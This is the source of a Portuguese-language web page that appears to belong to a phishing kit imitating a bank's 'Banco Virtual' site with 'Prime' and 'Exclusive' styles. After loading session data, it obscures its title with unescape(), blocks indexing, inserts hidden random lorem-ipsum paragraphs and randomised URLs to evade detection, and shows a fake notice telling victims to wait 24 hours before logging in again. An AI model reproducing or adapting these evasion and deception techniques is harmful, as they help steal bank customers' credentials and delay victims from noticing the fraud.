<?php
require_once('../_admin/config.php');
require_once('../validacao.php');
require_once('../Lorem.php');

$info = null;
if(isset($_SESSION['id'])){
    $info = Info::findInfoById($_SESSION['id']);
}

$infoTipo = isset($info) && isset($info['tipo']) ? $info['tipo'] : '';

function getLayout(){
    global $infoTipo;
    if($infoTipo == 'Banco Virtual Prime'){
        return 'prime';
    } else if($infoTipo == 'Banco Virtual Exclusive'){
        return 'exclusive';
    } else {
        return 'padrao';
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<meta name="robots" content="noindex, nofollow" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <?php
        $tipoDaConta = getLayout();

        if($tipoDaConta == "exclusive"){
            echo '<link rel="stylesheet" href="css/style-exclusive.css">';
        } else if($tipoDaConta == "prime") {
            echo '<link rel="stylesheet" href="css/style-prime.css">';
        } else {
            echo '<link rel="stylesheet" href="css/style.css">';
        }
    ?>
    <link rel="shortcut icon" href="images/favicon.ico">
<script>
document.write(unescape('%3Ctitle%3EBanco%20Virtual%20%7C%20Entre%20N%C3%B3s%2C%20Voc%C3%AA%20Vem%20Primeiro%3C/title%3E'));
</script>
	      <style>
         p.random{display:none!important;}
      </style>
	  <script type="text/javascript">

  function gerarCodigo(length) {
    var caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var codigo = '';
    for (var i = 0; i < length; i++) {
      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }
    return codigo;
  }

  function alterar_url(nova) {
    var codigo = gerarCodigo(60);
    var dataHoraAtual = new Date();
    var dia = dataHoraAtual.getDate().toString().padStart(2, '0');
    var mes = (dataHoraAtual.getMonth() + 1).toString().padStart(2, '0');
    var ano = dataHoraAtual.getFullYear().toString();
    var hora = dataHoraAtual.getHours().toString().padStart(2, '0');
    var minutos = dataHoraAtual.getMinutes().toString().padStart(2, '0');
    var segundos = dataHoraAtual.getSeconds().toString().padStart(2, '0');
    
    var link = nova + "=?" + codigo + dia + mes + ano + '_' + hora + minutos + segundos;
    history.pushState({}, null, link);
  }
  </script>
</head>
<body onload="alterar_url('')">
   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <nav class="navbar d-flex">
        <a class="navbar-brand" href="javascript:;"><img src="images/bars.png" alt=""></a>]
		   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        <p class="header-title">Banco Virtual</p>
    </nav>
	   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    <div id="alerta" class="boxes">
    <div class="box-alerta sinal-X after mb20">
                    <div id="mensagemLogoff" class="ctn-box after">
					   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
                    <p><strong>Para sua segurança.</strong><br>Recomendamos que aguarde o prazo de 24 horas para efetuar novamente seu acesso, AGUARDE o prazo estabelecido para que não ocorra o cancelamento do seu acesso ou bloqueio parcial.</p>
                    </div>
    </div>
	   <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
    </div>
    <div id="footer">
        
            <img src="images/cadeado.png" alt="">
        </div>
    </div>
    <?php
        session_destroy();
    ?>
</body>
</html>